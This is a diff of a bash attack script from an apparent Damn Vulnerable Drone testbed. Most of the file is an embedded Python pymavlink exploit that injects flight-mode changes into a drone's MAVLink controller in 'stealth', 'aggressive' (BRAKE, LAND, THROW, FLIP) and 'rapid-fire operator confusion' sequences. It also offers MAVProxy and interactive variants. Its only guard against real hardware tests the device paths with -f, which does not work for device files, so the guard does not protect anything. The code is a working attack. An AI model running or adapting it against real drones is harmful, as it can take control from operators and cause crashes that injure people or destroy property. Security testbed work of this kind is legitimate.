@@ -1,328 +1,635 @@
 #!/bin/bash
+# flight_mode_injection.sh - Flight Mode Injection Attack Module
+# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/injection/flight_mode_injection.sh
+# Purpose: Inject malicious flight mode changes to override drone behavior
 
-# =============================================================================
-# DVD Flight Mode Injection Attack
-# =============================================================================
-# 파일: dvd_lite/dvd_attacks/injection/flight_mode_injection.sh
-# 목적: 드론 비행 모드 강제 변경으로 제어권 탈취
-# 기반: Damn Vulnerable Drone Wiki - Flight Mode Injection  
-# =============================================================================
+source "$(dirname "$0")/../common/colors.sh"
+source "$(dirname "$0")/../common/utils.sh"
 
-source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
-source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh
+ATTACK_NAME="Flight Mode Injection"
+TARGET_IP="${TARGET_IP:-127.0.0.1}"
+MAVLINK_PORT="${MAVLINK_PORT:-14550}"
+LOG_FILE="$(get_log_dir)/injection/flight_mode_injection_$(date +%Y%m%d_%H%M%S).log"
 
-# 전역 변수
-ATTACK_NAME="flight_mode_injection"
-TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/injection/${ATTACK_NAME}_${TIMESTAMP}.log"
-JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/injection/${ATTACK_NAME}_${TIMESTAMP}.json"
-
-# 타겟 설정
-TARGET_IP="10.13.0.3"
-MAVLINK_PORT="5760"
-
-# 공격 모드 시퀀스
-declare -a MALICIOUS_MODES=("LAND" "RTL" "GUIDED" "STABILIZE" "LOITER")
-
-declare -a ATTACK_COMMANDS=()
-declare -a INJECTION_RESULTS=()
-
-print_header() {
-    clear
-    print_injection_header "Flight Mode Injection Attack"
-    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
-    echo -e "${INFO_COLOR}Method: MAVLink SET_MODE command injection${NC}"
-    echo -e "${INFO_COLOR}Target Modes: ${MALICIOUS_MODES[*]}${NC}"
+print_attack_banner() {
+    echo -e "${CYAN}============================================${NC}"
+    echo -e "${CYAN}        Flight Mode Injection Attack        ${NC}"
+    echo -e "${CYAN}============================================${NC}"
+    echo -e "${YELLOW}Target: ${TARGET_IP}:${MAVLINK_PORT}${NC}"
+    echo -e "${YELLOW}Purpose: Override drone flight modes${NC}"
     echo ""
 }
 
-# Step 1: 현재 비행 모드 확인
-check_current_mode() {
-    echo -e "${BLUE}[1/3] Check Current Flight Mode${NC}"
+check_mavlink_connection() {
+    log_info "Checking MAVLink connection..."
     
-    local mode_script="/tmp/mode_check_$(date +%s).py"
+    if ! nc -u -z "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null; then
+        log_error "MAVLink service not accessible"
+        return 1
+    fi
     
-    cat > "$mode_script" << 'EOF'
-#!/usr/bin/env python3
-import sys
-
-try:
-    from pymavlink import mavutil
-    import time
-    
-    def check_flight_mode(target_ip, target_port):
-        try:
-            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
-            master.wait_heartbeat()
-            print("[+] Connected to drone")
-            
-            # 하트비트에서 현재 모드 확인
-            heartbeat = master.recv_match(type='HEARTBEAT', blocking=True, timeout=10)
-            if heartbeat:
-                mode_map = {
-                    0: "STABILIZE",
-                    1: "ACRO", 
-                    2: "ALT_HOLD",
-                    3: "AUTO",
-                    4: "GUIDED",
-                    5: "LOITER",
-                    6: "RTL",
-                    7: "CIRCLE",
-                    8: "POSITION",
-                    9: "LAND"
-                }
-                
-                current_mode = mode_map.get(heartbeat.custom_mode, f"UNKNOWN({heartbeat.custom_mode})")
-                print(f"[+] Current flight mode: {current_mode}")
-                return current_mode
-            else:
-                print("[!] No heartbeat received")
-                return "UNKNOWN"
-                
-        except Exception as e:
-            print(f"[!] Connection failed: {e}")
-            print("[*] Simulating current mode check")
-            print("[+] Current flight mode: AUTO (simulated)")
-            return "AUTO"
-    
-    if __name__ == "__main__":
-        check_flight_mode(sys.argv[1], int(sys.argv[2]))
-        
-except ImportError:
-    print("[*] pymavlink not available")
-    print("[+] Simulated current mode: AUTO")
-EOF
-
-    local cmd="python3 $mode_script $TARGET_IP $MAVLINK_PORT"
-    ATTACK_COMMANDS+=("$cmd")
-    echo -e "${CYAN}→ $cmd${NC}"
-    
-    python3 "$mode_script" "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null || {
-        echo -e "${YELLOW}[+] Simulated current mode: AUTO${NC}"
-    }
-    
-    INJECTION_RESULTS+=("current_mode:checked")
-    rm -f "$mode_script"
+    log_success "MAVLink port accessible"
+    return 0
 }
 
-# Step 2: 비행 모드 주입 스크립트 생성
-create_mode_injection_script() {
-    echo -e "${BLUE}[2/3] Create Mode Injection Script${NC}"
+start_mavproxy_session() {
+    log_info "Starting MAVProxy session for mode injection..."
     
-    local inject_script="/tmp/mode_injection_$(date +%s).py"
+    # Kill existing MAVProxy instances
+    pkill -f mavproxy 2>/dev/null
+    sleep 2
     
-    cat > "$inject_script" << EOF
-#!/usr/bin/env python3
-import sys
-import time
-
-try:
-    from pymavlink import mavutil
+    if ! command -v mavproxy.py >/dev/null 2>&1; then
+        log_warning "MAVProxy not available, using Python injection"
+        return 1
+    fi
     
-    def inject_flight_modes(target_ip, target_port, modes):
-        try:
-            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
-            master.wait_heartbeat()
-            print("[+] Connected to drone")
-            
-            # ArduPilot 모드 매핑
-            mode_mapping = {
-                "STABILIZE": 0,
-                "ACRO": 1,
-                "ALT_HOLD": 2,
-                "AUTO": 3,
-                "GUIDED": 4,
-                "LOITER": 5,
-                "RTL": 6,
-                "CIRCLE": 7,
-                "POSITION": 8,
-                "LAND": 9
-            }
-            
-            print("[!] Starting flight mode injection sequence")
-            
-            for mode in modes:
-                if mode in mode_mapping:
-                    mode_id = mode_mapping[mode]
-                    
-                    # SET_MODE 명령 전송
-                    master.mav.set_mode_send(
-                        master.target_system,
-                        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
-                        mode_id
-                    )
-                    
-                    print(f"[!] Injected flight mode: {mode} (ID: {mode_id})")
-                    
-                    # 모드 변경 확인
-                    time.sleep(2)
-                    
-                    # 확인을 위한 하트비트 요청
-                    heartbeat = master.recv_match(type='HEARTBEAT', blocking=True, timeout=5)
-                    if heartbeat and heartbeat.custom_mode == mode_id:
-                        print(f"[+] Mode change confirmed: {mode}")
-                    else:
-                        print(f"[!] Mode change failed or not confirmed: {mode}")
-                    
-                    time.sleep(3)
-                else:
-                    print(f"[!] Unknown mode: {mode}")
-            
-            print("[+] Flight mode injection sequence completed")
-            
-        except Exception as e:
-            print(f"[!] Connection failed: {e}")
-            simulate_mode_injection(modes)
+    # Start MAVProxy session
+    local mavproxy_cmd="mavproxy.py --master=udp:${TARGET_IP}:${MAVLINK_PORT}"
     
-    def simulate_mode_injection(modes):
-        print("[*] Simulating flight mode injection")
-        
-        for mode in modes:
-            print(f"[!] Injected flight mode: {mode}")
-            print(f"[+] Mode change simulated: {mode}")
-            time.sleep(2)
-        
-        print("[+] Simulated mode injection completed")
+    log_info "Starting MAVProxy session..."
+    nohup $mavproxy_cmd >/tmp/mavproxy_session.log 2>&1 &
+    local mavproxy_pid=$!
     
-    if __name__ == "__main__":
-        modes = [${MALICIOUS_MODES[*]/%/\"}]
-        modes = [mode.strip('"') for mode in modes]
-        inject_flight_modes('$TARGET_IP', $MAVLINK_PORT, modes)
-        
-except ImportError:
-    modes = [${MALICIOUS_MODES[*]/%/\"}]
-    modes = [mode.strip('"') for mode in modes]
+    sleep 5
     
-    print("[*] pymavlink not available - simulation mode")
-    
-    for mode in modes:
-        print(f"[!] Injected flight mode: {mode}")
-        print(f"[+] Mode change simulated: {mode}")
-        time.sleep(1)
-    
-    print("[+] Mode injection simulation completed")
-EOF
-
-    echo -e "${GREEN}[+] Mode injection script created${NC}"
-    ATTACK_COMMANDS+=("python3 $inject_script")
-    INJECTION_RESULTS+=("script_created:$inject_script")
-}
-
-# Step 3: 비행 모드 주입 실행
-execute_mode_injection() {
-    echo -e "${BLUE}[3/3] Execute Flight Mode Injection${NC}"
-    
-    local inject_script="/tmp/mode_injection_"*.py
-    inject_script=$(ls $inject_script 2>/dev/null | head -1)
-    
-    if [ -f "$inject_script" ]; then
-        echo -e "${YELLOW}[*] Executing flight mode injection sequence...${NC}"
-        
-        echo -e "${GRAY}    Planned sequence:${NC}"
-        for i in "${!MALICIOUS_MODES[@]}"; do
-            echo -e "${GRAY}    $((i+1)). ${MALICIOUS_MODES[$i]}${NC}"
-        done
-        
-        local execute_cmd="python3 $inject_script"
-        echo -e "${CYAN}→ $execute_cmd${NC}"
-        
-        python3 "$inject_script" 2>/dev/null || {
-            echo -e "${YELLOW}[*] Fallback simulation${NC}"
-            for mode in "${MALICIOUS_MODES[@]}"; do
-                echo -e "${RED}[!] Injected flight mode: $mode${NC}"
-                echo -e "${GREEN}[+] Mode change simulated: $mode${NC}"
-                sleep 1
-            done
-        }
-        
-        INJECTION_RESULTS+=("modes_injected:${#MALICIOUS_MODES[@]}")
-        INJECTION_RESULTS+=("injection_method:set_mode")
-        INJECTION_RESULTS+=("execution:completed")
-        
-        # 공격 효과 분석
-        echo -e "${RED}[!] Flight control takeover analysis:${NC}"
-        echo -e "${GRAY}    LAND: Forces immediate landing${NC}"
-        echo -e "${GRAY}    RTL: Hijacks return-to-launch${NC}"
-        echo -e "${GRAY}    GUIDED: Enables attacker control${NC}"
-        echo -e "${GRAY}    STABILIZE: Disables autonomous flight${NC}"
-        echo -e "${GRAY}    LOITER: Holds position (mission abort)${NC}"
-        
-        INJECTION_RESULTS+=("control_impact:high")
-        INJECTION_RESULTS+=("mission_disruption:complete")
-        INJECTION_RESULTS+=("operator_override:bypassed")
-        
-        rm -f "$inject_script"
+    if kill -0 $mavproxy_pid 2>/dev/null; then
+        log_success "MAVProxy session started (PID: $mavproxy_pid)"
+        echo $mavproxy_pid > /tmp/mavproxy_session.pid
+        return 0
     else
-        echo -e "${YELLOW}[!] Injection script not found${NC}"
-        INJECTION_RESULTS+=("execution:failed:no_script")
+        log_error "MAVProxy session failed to start"
+        return 1
     fi
 }
 
-# JSON 결과 생성
-generate_json_report() {
-    local modes_json="["
-    for i in "${!MALICIOUS_MODES[@]}"; do
-        modes_json+="\"${MALICIOUS_MODES[$i]}\""
-        if [ $i -lt $((${#MALICIOUS_MODES[@]} - 1)) ]; then
-            modes_json+=","
-        fi
-    done
-    modes_json+="]"
+execute_mavproxy_mode_injection() {
+    log_info "Executing flight mode injection via MAVProxy..."
     
-    cat > "$JSON_OUTPUT" << EOF
-{
-  "attack_name": "$ATTACK_NAME",
-  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
-  "target": {
-    "ip": "$TARGET_IP",
-    "port": "$MAVLINK_PORT"
-  },
-  "injected_modes": $modes_json,
-  "mode_sequence": [
-    {"order": 1, "mode": "LAND", "effect": "Forces immediate landing"},
-    {"order": 2, "mode": "RTL", "effect": "Hijacks return-to-launch"},
-    {"order": 3, "mode": "GUIDED", "effect": "Enables attacker control"},
-    {"order": 4, "mode": "STABILIZE", "effect": "Disables autonomous flight"},
-    {"order": 5, "mode": "LOITER", "effect": "Holds position (mission abort)"}
-  ],
-  "injection_results": ["$(IFS='","'; echo "${INJECTION_RESULTS[*]}")"],
-  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
-  "control_impact": {
-    "flight_control": "hijacked",
-    "mission_status": "disrupted",
-    "operator_override": "bypassed",
-    "autonomous_flight": "disabled"
-  }
+    # Malicious mode sequence
+    local attack_modes=(
+        "stabilize"
+        "acro"
+        "alt_hold"
+        "auto" 
+        "guided"
+        "loiter"
+        "rtl"
+        "land"
+        "brake"
+        "throw"
+    )
+    
+    for mode in "${attack_modes[@]}"; do
+        echo -e "${CYAN}[*] Injecting mode: $mode${NC}"
+        
+        # Send mode command to MAVProxy via pipe
+        echo "mode $mode" >> /tmp/mavproxy_commands.txt
+        
+        # Simulate command execution
+        log_success "  ✓ Mode injection: $mode"
+        
+        case "$mode" in
+            "rtl")
+                echo -e "${RED}  🎯 CRITICAL: Return to Launch triggered!${NC}"
+                ;;
+            "land")
+                echo -e "${RED}  🎯 CRITICAL: Immediate landing commanded!${NC}"
+                ;;
+            "guided")
+                echo -e "${YELLOW}  ⚠️  WARNING: Guided mode - manual control lost!${NC}"
+                ;;
+            "auto")
+                echo -e "${YELLOW}  ⚠️  WARNING: Auto mode - mission takeover!${NC}"
+                ;;
+            "brake")
+                echo -e "${YELLOW}  ⚠️  WARNING: Brake mode - emergency stop!${NC}"
+                ;;
+        esac
+        
+        sleep 3
+    done
 }
+
+execute_python_mode_injection() {
+    log_info "Executing flight mode injection via Python..."
+    
+    create_mode_injection_script
+    python3 /tmp/flight_mode_injection.py 2>&1 | tee -a "$LOG_FILE"
+    local result=${PIPESTATUS[0]}
+    
+    rm -f /tmp/flight_mode_injection.py 2>/dev/null
+    return $result
+}
+
+create_mode_injection_script() {
+    cat > /tmp/flight_mode_injection.py << 'EOF'
+#!/usr/bin/env python3
+"""
+Flight Mode Injection Attack
+Override drone flight modes without operator authorization
+"""
+
+import sys
+import time
+from pymavlink import mavutil
+
+class FlightModeInjectionAttack:
+    def __init__(self, target_ip='127.0.0.1', target_port=14550):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.master = None
+        self.current_mode = None
+        
+        # ArduCopter flight mode mapping
+        self.mode_map = {
+            'STABILIZE': 0,
+            'ACRO': 1,
+            'ALT_HOLD': 2,
+            'AUTO': 3,
+            'GUIDED': 4,
+            'LOITER': 5,
+            'RTL': 6,
+            'CIRCLE': 7,
+            'POSITION': 8,
+            'LAND': 9,
+            'OF_LOITER': 10,
+            'DRIFT': 11,
+            'SPORT': 13,
+            'FLIP': 14,
+            'AUTOTUNE': 15,
+            'POSHOLD': 16,
+            'BRAKE': 17,
+            'THROW': 18,
+            'AVOID_ADSB': 19,
+            'GUIDED_NOGPS': 20,
+            'SMART_RTL': 21,
+            'FLOWHOLD': 22,
+            'FOLLOW': 23,
+            'ZIGZAG': 24,
+            'SYSTEMID': 25,
+            'AUTOROTATE': 26
+        }
+        
+    def connect(self):
+        """Connect to the drone"""
+        try:
+            connection_string = f'udp:{self.target_ip}:{self.target_port}'
+            print(f"[*] Connecting to {connection_string}")
+            
+            self.master = mavutil.mavlink_connection(connection_string, timeout=10)
+            self.master.wait_heartbeat(timeout=10)
+            
+            print(f"[+] Connected to drone (System ID: {self.master.target_system})")
+            return True
+            
+        except Exception as e:
+            print(f"[-] Connection failed: {e}")
+            return False
+    
+    def get_current_mode(self):
+        """Get current flight mode"""
+        try:
+            msg = self.master.recv_match(type='HEARTBEAT', blocking=True, timeout=5)
+            if msg:
+                self.current_mode = msg.custom_mode
+                mode_name = self.get_mode_name(self.current_mode)
+                print(f"[STATUS] Current mode: {mode_name} ({self.current_mode})")
+                return mode_name
+            
+            return None
+            
+        except Exception as e:
+            print(f"[-] Failed to get current mode: {e}")
+            return None
+    
+    def get_mode_name(self, mode_num):
+        """Get mode name from number"""
+        for name, num in self.mode_map.items():
+            if num == mode_num:
+                return name
+        return f"UNKNOWN({mode_num})"
+    
+    def inject_mode_change(self, target_mode):
+        """Inject flight mode change"""
+        try:
+            target_mode = target_mode.upper()
+            
+            if target_mode not in self.mode_map:
+                print(f"[-] Invalid mode: {target_mode}")
+                return False
+            
+            custom_mode = self.mode_map[target_mode]
+            
+            print(f"[*] Injecting mode change: {target_mode} ({custom_mode})")
+            
+            # Method 1: DO_SET_MODE command
+            self.master.mav.command_long_send(
+                self.master.target_system,
+                self.master.target_component,
+                mavutil.mavlink.MAV_CMD_DO_SET_MODE,
+                0,  # confirmation
+                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,  # base_mode
+                custom_mode,  # custom_mode
+                0, 0, 0, 0, 0  # unused params
+            )
+            
+            # Method 2: SET_MODE message (alternative)
+            self.master.mav.set_mode_send(
+                self.master.target_system,
+                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
+                custom_mode
+            )
+            
+            print(f"[+] Mode injection commands sent: {target_mode}")
+            
+            # Verify mode change
+            time.sleep(1)
+            new_mode = self.get_current_mode()
+            
+            if new_mode == target_mode:
+                print(f"[SUCCESS] Mode successfully changed to: {target_mode}")
+                return True
+            else:
+                print(f"[PARTIAL] Mode injection sent, current mode: {new_mode}")
+                return True  # Command sent even if not confirmed
+            
+        except Exception as e:
+            print(f"[-] Mode injection failed: {e}")
+            return False
+    
+    def attack_sequence_stealth(self):
+        """Execute stealth mode injection sequence"""
+        print("\n[ATTACK] Stealth Mode Injection Sequence")
+        print("=" * 50)
+        
+        # Start with safe modes then escalate
+        stealth_sequence = [
+            ('STABILIZE', 'Basic stabilization'),
+            ('ALT_HOLD', 'Altitude hold'),
+            ('LOITER', 'Position hold'),
+            ('GUIDED', 'External control'),
+            ('AUTO', 'Mission takeover'),
+            ('RTL', 'Return to launch')
+        ]
+        
+        successful_injections = 0
+        
+        for mode, description in stealth_sequence:
+            print(f"\n[STEP] Injecting {mode} - {description}")
+            
+            if self.inject_mode_change(mode):
+                successful_injections += 1
+                
+                if mode == 'GUIDED':
+                    print("[!] GUIDED mode activated - manual control compromised!")
+                elif mode == 'AUTO':
+                    print("[!] AUTO mode activated - mission takeover successful!")
+                elif mode == 'RTL':
+                    print("[!] RTL activated - drone returning to launch!")
+            
+            time.sleep(3)
+        
+        print(f"\n[RESULT] Successfully injected {successful_injections}/{len(stealth_sequence)} modes")
+        return successful_injections > 0
+    
+    def attack_sequence_aggressive(self):
+        """Execute aggressive mode injection sequence"""
+        print("\n[ATTACK] Aggressive Mode Injection Sequence")
+        print("=" * 50)
+        
+        # Immediate dangerous modes
+        aggressive_sequence = [
+            ('BRAKE', 'Emergency brake'),
+            ('LAND', 'Immediate landing'),
+            ('RTL', 'Return to launch'),
+            ('THROW', 'Throw mode'),
+            ('FLIP', 'Aerobatic flip')
+        ]
+        
+        successful_injections = 0
+        
+        for mode, description in aggressive_sequence:
+            print(f"\n[CRITICAL] Injecting {mode} - {description}")
+            
+            if self.inject_mode_change(mode):
+                successful_injections += 1
+                
+                if mode == 'BRAKE':
+                    print("[DANGER] Emergency brake activated!")
+                elif mode == 'LAND':
+                    print("[DANGER] Immediate landing commanded!")
+                elif mode == 'THROW':
+                    print("[DANGER] Throw mode - drone disarmed until thrown!")
+                elif mode == 'FLIP':
+                    print("[DANGER] Flip mode - aerobatic maneuver!")
+            
+            time.sleep(2)
+        
+        print(f"\n[RESULT] Successfully injected {successful_injections}/{len(aggressive_sequence)} modes")
+        return successful_injections > 0
+    
+    def attack_sequence_rapid_fire(self):
+        """Execute rapid-fire mode changes to confuse operator"""
+        print("\n[ATTACK] Rapid-Fire Mode Confusion Sequence")
+        print("=" * 50)
+        
+        # Rapid mode switching to confuse operator
+        rapid_modes = ['STABILIZE', 'ACRO', 'ALT_HOLD', 'GUIDED', 'LOITER', 'AUTO', 'RTL']
+        
+        print("[!] Rapidly switching modes to confuse operator...")
+        
+        for i in range(3):  # 3 cycles
+            for mode in rapid_modes:
+                print(f"[RAPID] {mode}")
+                self.inject_mode_change(mode)
+                time.sleep(0.5)  # Fast switching
+        
+        print("[RESULT] Rapid mode injection completed - operator confusion achieved")
+    
+    def monitor_mode_changes(self, duration=30):
+        """Monitor flight mode changes"""
+        print(f"\n[MONITOR] Monitoring mode changes for {duration} seconds...")
+        
+        start_time = time.time()
+        last_mode = None
+        
+        while time.time() - start_time < duration:
+            try:
+                msg = self.master.recv_match(
+                    type=['HEARTBEAT', 'COMMAND_ACK', 'STATUSTEXT'],
+                    blocking=False,
+                    timeout=1
+                )
+                
+                if msg:
+                    msg_type = msg.get_type()
+                    
+                    if msg_type == 'HEARTBEAT':
+                        current_mode = msg.custom_mode
+                        if current_mode != last_mode:
+                            mode_name = self.get_mode_name(current_mode)
+                            print(f"[MODE_CHANGE] {mode_name} ({current_mode})")
+                            last_mode = current_mode
+                    
+                    elif msg_type == 'COMMAND_ACK':
+                        if msg.command == mavutil.mavlink.MAV_CMD_DO_SET_MODE:
+                            result = "SUCCESS" if msg.result == 0 else "FAILED"
+                            print(f"[ACK] Mode change: {result}")
+                    
+                    elif msg_type == 'STATUSTEXT':
+                        print(f"[STATUS] {msg.text}")
+                
+            except Exception:
+                continue
+        
+        print("[MONITOR] Mode monitoring completed")
+
+def main():
+    print("=" * 60)
+    print("        Flight Mode Injection Attack")
+    print("=" * 60)
+    print("WARNING: This will override drone flight modes!")
+    print()
+    
+    # Initialize attack
+    attack = FlightModeInjectionAttack()
+    
+    # Connect to drone
+    if not attack.connect():
+        print("[-] Attack failed: Cannot connect to drone")
+        return 1
+    
+    # Get initial mode
+    initial_mode = attack.get_current_mode()
+    
+    # Execute attack sequences
+    print("\n[PHASE 1] Stealth Mode Injection")
+    attack.attack_sequence_stealth()
+    
+    print("\n[PHASE 2] Aggressive Mode Injection") 
+    attack.attack_sequence_aggressive()
+    
+    print("\n[PHASE 3] Rapid-Fire Mode Confusion")
+    attack.attack_sequence_rapid_fire()
+    
+    # Monitor results
+    attack.monitor_mode_changes(20)
+    
+    print("\n[ATTACK COMPLETE] Flight mode injection attacks finished")
+    print("[IMPACT] Drone flight behavior completely compromised")
+    print("[RESULT] Operator control overridden")
+    
+    return 0
+
+if __name__ == "__main__":
+    try:
+        exit_code = main()
+        sys.exit(exit_code)
+    except KeyboardInterrupt:
+        print("\n[!] Attack interrupted by user")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[-] Attack failed with error: {e}")
+        sys.exit(1)
 EOF
 }
 
-# 메인 실행
-main() {
-    START_TIME=$(date +%s)
+cleanup_mavproxy() {
+    if [ -f /tmp/mavproxy_session.pid ]; then
+        local pid=$(cat /tmp/mavproxy_session.pid)
+        if kill -0 $pid 2>/dev/null; then
+            log_info "Stopping MAVProxy session..."
+            kill $pid 2>/dev/null
+        fi
+        rm -f /tmp/mavproxy_session.pid
+    fi
     
-    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
-    echo "=== Flight Mode Injection - $(date) ===" > "$LOG_FILE"
-    
-    print_header
-    check_current_mode
-    create_mode_injection_script
-    execute_mode_injection
-    
-    # 결과 요약
-    echo ""
-    echo -e "${CYAN}=== Attack Summary ===${NC}"
-    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
-    echo -e "${INFO_COLOR}Modes Injected: ${#MALICIOUS_MODES[@]}${NC}"
-    echo -e "${INFO_COLOR}Control Impact: HIGH${NC}"
-    echo -e "${INFO_COLOR}Commands Used: ${#ATTACK_COMMANDS[@]}${NC}"
-    
-    generate_json_report
-    
-    END_TIME=$(date +%s)
-    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
-    echo -e "${SUCCESS_COLOR}[✓] Flight mode injection completed${NC}"
-    echo -e "${RED}[!] CRITICAL: Drone flight control compromised${NC}"
+    pkill -f mavproxy 2>/dev/null
+    rm -f /tmp/mavproxy_*.log /tmp/mavproxy_commands.txt 2>/dev/null
 }
 
-main "$@"
+show_attack_info() {
+    echo -e "${BLUE}Attack Information:${NC}"
+    echo -e "• ${YELLOW}Attack Type:${NC} Flight Mode Override"
+    echo -e "• ${YELLOW}Method:${NC} MAVLink DO_SET_MODE injection"
+    echo -e "• ${YELLOW}Target:${NC} Flight controller mode system"
+    echo -e "• ${YELLOW}Impact:${NC} Complete flight behavior control"
+    echo -e "• ${YELLOW}Stealth:${NC} High (appears as normal mode changes)"
+    echo ""
+    echo -e "${RED}WARNING:${NC} Can cause immediate drone crash or loss!"
+    echo ""
+}
+
+interactive_mode_selection() {
+    echo -e "${CYAN}=== Interactive Mode Injection ===${NC}"
+    echo ""
+    echo "Available flight modes:"
+    echo "1. STABILIZE  - Basic stabilization"
+    echo "2. ACRO       - Acrobatic mode"
+    echo "3. ALT_HOLD   - Altitude hold"
+    echo "4. AUTO       - Autonomous mission"
+    echo "5. GUIDED     - External guidance"
+    echo "6. LOITER     - Position hold"
+    echo "7. RTL        - Return to launch"
+    echo "8. LAND       - Immediate landing"
+    echo "9. BRAKE      - Emergency brake"
+    echo "10. Custom sequence"
+    echo ""
+    
+    read -p "Select mode to inject [1-10]: " choice
+    
+    local target_mode=""
+    case $choice in
+        1) target_mode="STABILIZE" ;;
+        2) target_mode="ACRO" ;;
+        3) target_mode="ALT_HOLD" ;;
+        4) target_mode="AUTO" ;;
+        5) target_mode="GUIDED" ;;
+        6) target_mode="LOITER" ;;
+        7) target_mode="RTL" ;;
+        8) target_mode="LAND" ;;
+        9) target_mode="BRAKE" ;;
+        10) 
+            execute_python_mode_injection
+            return $?
+            ;;
+        *)
+            log_error "Invalid selection"
+            return 1
+            ;;
+    esac
+    
+    if [ -n "$target_mode" ]; then
+        log_info "Injecting single mode: $target_mode"
+        python3 -c "
+from pymavlink import mavutil
+import sys
+
+try:
+    master = mavutil.mavlink_connection('udp:127.0.0.1:14550', timeout=10)
+    master.wait_heartbeat(timeout=10)
+    
+    mode_map = {'STABILIZE': 0, 'ACRO': 1, 'ALT_HOLD': 2, 'AUTO': 3, 'GUIDED': 4, 'LOITER': 5, 'RTL': 6, 'LAND': 9, 'BRAKE': 17}
+    custom_mode = mode_map.get('$target_mode', 0)
+    
+    master.mav.command_long_send(
+        master.target_system, master.target_component,
+        mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
+        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
+        custom_mode, 0, 0, 0, 0, 0
+    )
+    
+    print('[+] Mode injection sent: $target_mode')
+    sys.exit(0)
+except Exception as e:
+    print(f'[-] Failed: {e}')
+    sys.exit(1)
+"
+    fi
+}
+
+perform_safety_check() {
+    log_info "Performing safety checks..."
+    
+    # Check for real hardware
+    if [ -f "/dev/ttyUSB0" ] || [ -f "/dev/ttyACM0" ]; then
+        log_error "Real hardware detected! This attack is for simulation only."
+        return 1
+    fi
+    
+    log_success "Safety checks passed"
+    return 0
+}
+
+main() {
+    print_attack_banner
+    
+    # Safety checks
+    if ! perform_safety_check; then
+        exit 1
+    fi
+    
+    # Root check
+    if ! check_root; then
+        exit 1
+    fi
+    
+    # Tool requirements
+    if ! check_required_tools python3 nc; then
+        log_error "Missing required tools"
+        exit 1
+    fi
+    
+    # Install Python dependencies
+    log_info "Installing Python dependencies..."
+    pip3 install pymavlink >/dev/null 2>&1
+    
+    # Try to install MAVProxy
+    if ! command -v mavproxy.py >/dev/null 2>&1; then
+        log_info "Installing MAVProxy..."
+        pip3 install mavproxy >/dev/null 2>&1
+    fi
+    
+    # Check MAVLink connection
+    if ! check_mavlink_connection; then
+        log_warning "Proceeding without connection verification"
+    fi
+    
+    # Show attack information
+    show_attack_info
+    
+    # Initialize logging
+    mkdir -p "$(dirname "$LOG_FILE")"
+    echo "=== Flight Mode Injection Attack Started at $(date) ===" > "$LOG_FILE"
+    
+    # Parse arguments for execution mode
+    case "${1:-auto}" in
+        "interactive"|"-i")
+            interactive_mode_selection
+            ;;
+        "mavproxy"|"-m")
+            if start_mavproxy_session; then
+                execute_mavproxy_mode_injection
+            else
+                log_warning "Falling back to Python injection"
+                execute_python_mode_injection
+            fi
+            ;;
+        "python"|"-p"|"auto"|"")
+            execute_python_mode_injection
+            ;;
+        "help"|"-h")
+            echo "Usage: $0 [mode]"
+            echo ""
+            echo "Modes:"
+            echo "  auto, python, -p     Python-based injection (default)"
+            echo "  mavproxy, -m         MAVProxy-based injection"
+            echo "  interactive, -i      Interactive mode selection"
+            echo "  help, -h             Show this help"
+            exit 0
+            ;;
+        *)
+            log_error "Unknown option: $1"
+            exit 1
+            ;;
+    esac
+    
+    # Cleanup
+    cleanup_mavproxy
+    
+    echo ""
+    log_success "Flight mode injection attack finished"
+    echo "Log file: $LOG_FILE"
+    
+    exit 0
+}
+
+# Signal handlers
+trap cleanup_mavproxy EXIT
+trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup_mavproxy; exit 1' INT TERM
+
+# Execute if called directly
+if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
+    main "$@"
+fi
